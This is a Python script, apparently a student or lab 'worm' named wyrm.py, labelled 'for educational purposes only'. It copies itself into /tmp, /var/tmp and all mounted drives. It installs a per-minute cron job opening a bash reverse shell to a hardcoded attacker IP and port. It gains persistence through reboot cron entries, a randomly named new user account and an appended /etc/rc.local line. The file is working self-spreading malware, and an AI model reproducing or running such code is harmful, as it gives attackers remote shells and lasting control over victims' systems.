#!/usr/bin/env python3
import sys
from sys import argv
import os
import random
import string

#name of script, name of directory to create
script = argv
name = str(script[0])


#not for use outside test scenario. For Educational purposes only.


def cloning(directory):
#replication
	
#for if the dir already exists

	if os.path.exists(directory):
		os.system(r'rm -r ' + directory)


#replication 

#Creates a directory and copies itself to it, copies itself to the /var/tmp file as well as /tmp
	os.mkdir(directory)
	os.system(r"cp " + name + " " + directory)
	os.system(r"cp " + name + " /var/tmp")
	os.system(r"cp " + name + " /tmp")


#need some way to establish persistence on the victim

#sets up a cron job to create a reverse shell into the victim machine
#sets up an addtional cron jobs to run the worm again in the /tmp and /var/tmp folders

#			Args - IP - Attacker IP 
#				  Port - Port to run reverse shell through

def cron(IP,Port):
		
	
	#adds multiple cronjobs to establish persistence, as well as a reverse shell
	#reverse shell is created using bash

	os.system(f"echo '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/{IP}/{Port} 0>&1\"' > cron")
	os.system(r'echo "@reboot /usr/bin/python /var/tmp/wyrm.py" >> cron')
	os.system(r'echo "@reboot /usr/bin/python /tmp/wyrm.py" >> cron')
	os.system(r'crontab -i cron')
	os.system(r'rm cron')
	
# Copies itself to all mounted drives
# May fail due to a lack of permissions, will pass if so
def replicate_to_drives():
	try:
		drives = os.popen("df | awk '{print $6}'").read().split('\n')
		for drive in drives:
			if os.path.ismount(drive):
				os.system(f"cp {sys.argv[0]} {drive}")
	except:
		pass

#creates user with random user and password to and creates cronjob to run the script at start-up
# May fail due to a lack of permissions, will pass if so
# Many machines wont allow creation of new users, will likely pass unless it's run as root
def establish_persistence():
	try:	
		username = "".join(random.choices(string.ascii_letters + string.digits, k=10))
		password = "".join(random.choices(string.ascii_letters + string.digits, k=10))
		os.system(f"useradd -p $(openssl passwd -1 {password}) {username}")
		with open(f"/var/spool/cron/{username}", "w") as crontab:
			crontab.write(f"@reboot /usr/bin/python {sys.argv[0]} &\n")
	except:
		pass

#modifies the /etc/rc.local file to set up persistence
# Many machines wont allow appending to the rc.local file without Root permissions, will likely pass unless run as root

def persistrclocal():
	try:
		with open("/etc/rc.local", "a") as rc_local:
			rc_local.write(f"/usr/bin/python {sys.argv[0]} &\n")
	except:
		pass


#main function
def main():
	cloning("gravlax")
	cron("192.168.39.4","8080")
	replicate_to_drives()
	establish_persistence()
	persistrclocal()




if __name__ == "__main__":
	main()